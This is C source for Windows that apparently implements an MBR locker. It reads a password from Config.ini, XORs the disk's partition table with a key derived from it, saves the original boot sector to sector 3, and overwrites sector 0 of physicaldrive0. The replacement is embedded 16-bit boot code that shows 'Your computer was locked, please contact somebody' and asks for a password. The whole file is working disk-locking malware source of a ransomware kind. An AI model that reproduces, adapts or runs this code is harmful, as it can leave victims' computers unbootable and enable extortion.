#include <windows.h>

#define cryptFlag 445
int read_disk(int id, int num, unsigned char* buffer);
int write_disk(int id, int num, unsigned char* buffer);
/**
* idea is to encrypt partition table
*/
int _stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
    unsigned char mbr_data[512] = {
        0x8C, 0xC8, 0x8E, 0xD8, 0x8E, 0xD0, 0x8E, 0xC0, 0xBC, 0x00, 0x01, 0xBD, 0xFF, 0x7C, 0xB9, 0x31, 
        0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xB2, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xB8, 0x05, 0xA0, 
        0x00, 0x8E, 0xD8, 0x31, 0xC9, 0x31, 0xDB, 0x31, 0xC0, 0xCD, 0x16, 0x3C, 0x08, 0x74, 0x1B, 0x3C, 
        0x0D, 0x74, 0x26, 0xB4, 0x02, 0x88, 0x07, 0x88, 0x67, 0x01, 0x30, 0xC0, 0x88, 0x47, 0x02, 0x83, 
        0xC3, 0x02, 0x41, 0x2E, 0x89, 0x0E, 0xFE, 0x7C, 0xEB, 0xDD, 0x83, 0xEB, 0x02, 0x49, 0x2E, 0x89, 
        0x0E, 0xFE, 0x7C, 0x31, 0xC0, 0x89, 0x07, 0xEB, 0xCE, 0x8C, 0xC8, 0x8E, 0xC0, 0x31, 0xDB, 0x3E, 
        0x8A, 0x07, 0x3C, 0x43, 0x75, 0x73, 0x83, 0xC3, 0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x61, 0x75, 0x69, 
        0x83, 0xC3, 0x02, 0x3E, 0x8A, 0x07, 0x3C, 0x4D, 0x75, 0x5F, 0x83, 0xC3, 0x02, 0xB1, 0xFF, 0xB5, 
        0x00, 0x2E, 0x88, 0x2E, 0xFD, 0x7C, 0x3E, 0x8A, 0x07, 0x3C, 0x00, 0x74, 0x0A, 0x2E, 0x30, 0x06, 
        0xFD, 0x7C, 0x83, 0xC3, 0x02, 0xE2, 0xEF, 0xB8, 0x00, 0x7E, 0x8E, 0xC0, 0x31, 0xDB, 0xB4, 0x02, 
        0xB2, 0x80, 0xB0, 0x01, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x03, 0xCD, 0x13, 0xBB, 0xBD, 0x01, 0x30, 
        0xED, 0x26, 0x88, 0x2F, 0xBB, 0xBE, 0x01, 0xB1, 0x40, 0x26, 0x8A, 0x07, 0x2E, 0x32, 0x06, 0xFD, 
        0x7C, 0x26, 0x88, 0x07, 0x43, 0xE2, 0xF2, 0x31, 0xDB, 0xB4, 0x03, 0xB2, 0x80, 0xB0, 0x01, 0xB6, 
        0x00, 0xB5, 0x00, 0xB1, 0x01, 0xCD, 0x13, 0xEB, 0x1B, 0xBB, 0x00, 0xB8, 0x83, 0xC3, 0x31, 0xB0, 
        0x58, 0x88, 0x07, 0x2E, 0x8B, 0x0E, 0xFE, 0x7C, 0x31, 0xC0, 0x89, 0x07, 0x83, 0xC3, 0x02, 0xE2, 
        0xF9, 0xE9, 0x0C, 0xFF, 0xB8, 0xFF, 0xFF, 0x50, 0xB8, 0x00, 0x00, 0x50, 0xCB, 0x00, 0x00, 0x59, 
        0x6F, 0x75, 0x72, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x77, 0x61, 0x73, 
        0x20, 0x6C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x2C, 0x20, 0x70, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x20, 
        0x63, 0x6F, 0x6E, 0x74, 0x61, 0x63, 0x74, 0x20, 0x73, 0x6F, 0x6D, 0x65, 0x62, 0x6F, 0x64, 0x79, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 
        0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0F, 0x55, 0xAA
    };
    char keys[256] = {0};               // read ini file password
    unsigned char mbr[512] = {0};       // original mbr data
    unsigned int len;
    int i = 0;

    GetPrivateProfileStringA("Locker", "psw", "jk", keys, 256, ".\\Config.ini");
    len = strlen(keys);

    if(len == 0 || len >= 18){
        MessageBoxA(NULL, "Error! Password should be less than 18 bytes...", "Error", MB_OK | MB_ICONERROR);
        exit(-1);
    }
    byte XResult = 0;                   // pwd xor value
    for (int i = 0; i < len; ++i)
        XResult ^= keys[i];
    
    if(read_disk(0, 1, mbr) == 0){      // read original mbr
        MessageBoxA(NULL, "Read MBR failed!", "Error", MB_OK | MB_ICONERROR);
        exit(-1);
    }

    if(mbr[cryptFlag] == 0x16){         // check flag
        MessageBoxA(NULL, "Error! It is already locked, do not repeat...", "Error", MB_OK | MB_ICONERROR);
        exit(-1);
    }

    mbr[cryptFlag] = 0x16;
    for (int i = 0; i < 64; ++i){
        mbr[446 + i] ^= XResult;
    }
    write_disk(2, 1, mbr);              // save orginal mbr to sector 3
    memcpy(mbr_data + cryptFlag, mbr + cryptFlag, 67);
    write_disk(0, 1, mbr_data);
    MessageBoxA(NULL, "Locked...", "Error", MB_OK | MB_ICONERROR);
    return 0;
}

int read_disk(int id, int num, unsigned char* buffer){
    HANDLE hFile = NULL;
    int offset = 0;
    int readSize = 0;
    DWORD readed = 0;
    offset = id * 512;
    readSize = num * 512;
    if(buffer == NULL) return readSize;
    hFile = CreateFileA("\\\\.\\\\physicaldrive0",
        GENERIC_READ,
        FILE_SHARE_READ|FILE_SHARE_WRITE, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        MessageBoxA(NULL, "Cannot open physicaldrive0...", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }
    SetFilePointer(hFile, offset, 0, 0);
    ReadFile(hFile, buffer, readSize, &readed, NULL);
    CloseHandle(hFile);
    return readed;
}
int write_disk(int id, int num, unsigned char* buffer){
    HANDLE hFile = NULL;
    int offset = 0;
    int writeSize = 0;
    DWORD writed = 0;
    offset = id * 512;
    writeSize = num * 512;
    if(buffer == NULL) return writeSize;
    hFile = CreateFileA("\\\\.\\\\physicaldrive0", 1073741824, 1, 0, 3, 128, 0);
    if(hFile == INVALID_HANDLE_VALUE){
        MessageBoxA(NULL, "Cannot open physicaldrive0...", "Error", MB_OK | MB_ICONERROR);
        return 0;
    }
    SetFilePointer(hFile, offset, 0, 0);
    WriteFile(hFile, buffer, writeSize, &writed, NULL);
    CloseHandle(hFile);
    return writeSize;
}